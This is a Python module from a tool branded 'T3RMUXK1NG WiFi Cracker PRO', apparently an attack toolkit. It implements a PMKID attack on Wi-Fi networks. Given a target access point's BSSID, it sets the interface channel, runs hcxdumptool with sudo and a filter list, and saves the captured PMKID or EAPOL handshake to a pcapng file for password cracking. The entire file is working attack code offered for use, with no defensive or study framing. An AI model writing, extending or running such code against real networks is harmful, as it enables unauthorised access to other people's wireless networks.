#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""T3RMUXK1NG WiFi Cracker PRO v4.0 - PMKID Attack Module"""

import os
import sys
import time
import subprocess
from typing import Dict, Optional
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import Logger

logger = Logger('PMKID')


@dataclass
class PMKIDResult:
    success: bool
    bssid: str
    pmkid_file: str = ""
    time_taken: float = 0.0
    error: str = ""


class PMKIDAttacker:
    """PMKID Attack - No client needed"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.process = None
        self.running = False
        self.output_dir = Path('/tmp/pmkid')
        self.output_dir.mkdir(exist_ok=True)
        self.stats = {'attacks': 0, 'successful': 0}
    
    def attack(self, bssid: str, timeout: int = 60, channel: int = None) -> PMKIDResult:
        """Execute PMKID attack"""
        self.stats['attacks'] += 1
        start_time = time.time()
        self.running = True
        
        if channel:
            self._set_channel(channel)
        
        output_file = str(self.output_dir / f"pmkid_{bssid.replace(':', '')}_{int(time.time())}.pcapng")
        
        result = self._attack_hcxdumptool(bssid, output_file, timeout)
        result.time_taken = time.time() - start_time
        
        if result.success:
            self.stats['successful'] += 1
        
        return result
    
    def _attack_hcxdumptool(self, bssid: str, output_file: str, timeout: int) -> PMKIDResult:
        """PMKID attack using hcxdumptool"""
        try:
            filter_file = f"/tmp/pmkid_filter_{int(time.time())}.txt"
            with open(filter_file, 'w') as f:
                f.write(bssid.replace(':', ''))
            
            cmd = ['sudo', 'hcxdumptool', '-i', self.interface,
                   '-o', output_file, '--enable_status=1',
                   '--filterlist_ap', filter_file, '--filtermode=2']
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            pmkid_found = False
            start = time.time()
            
            while time.time() - start < timeout and self.running:
                line = self.process.stdout.readline()
                if 'PMKID' in line or 'EAPOL' in line:
                    pmkid_found = True
                    break
            
            self.process.terminate()
            os.remove(filter_file)
            
            if pmkid_found and os.path.exists(output_file):
                return PMKIDResult(success=True, bssid=bssid, pmkid_file=output_file)
            
            return PMKIDResult(success=False, bssid=bssid, error="PMKID not captured")
        
        except FileNotFoundError:
            return PMKIDResult(success=False, bssid=bssid, error="hcxdumptool not found")
        except Exception as e:
            return PMKIDResult(success=False, bssid=bssid, error=str(e))
    
    def _set_channel(self, channel: int):
        try:
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)],
                         capture_output=True, timeout=5)
        except:
            pass
    
    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()
    
    def get_stats(self) -> Dict: return self.stats.copy()
